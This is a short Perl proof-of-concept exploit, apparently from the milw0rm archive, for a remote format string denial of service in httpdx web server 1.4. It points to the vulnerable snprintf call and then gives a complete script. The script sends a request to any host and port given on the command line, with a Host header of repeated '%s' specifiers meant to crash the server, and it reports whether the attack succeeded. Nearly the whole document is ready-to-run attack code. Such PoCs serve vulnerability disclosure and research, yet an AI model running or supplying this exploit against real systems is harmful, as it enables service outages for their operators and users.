# httpdx Web Server 1.4 'Host Header' Remote Format String Denial of Service PoC
# 
# Coded by Pankaj Kohli
# http://www.pank4j.com
#
# httpdx web server 1.4 is vulnerable to a remote format string vulnerability through the Host header.
# The vulnerability lies in httpd_src/http.cpp in h_readrequest() : snprintf(temp[1],MAX,client->host);
#

use LWP;

(($target = $ARGV[0]) && ($port = $ARGV[1])) || die "Usage: $0 <target> <port> \n";

my $ua = new LWP::UserAgent;
print "Connecting to $target on port $port\n";
my $request = new HTTP::Request('GET', "http://" . $target . ":" . $port);
print "Sending evil header \n";
my $host_header =  "%s"x32;
$request->header('Host', $host_header); my $response = $ua->request($request);

if ($response->is_success) { print "DoS Failed \n" }
else { print "DoS Successful \n" } 

# milw0rm.com [2009-09-14]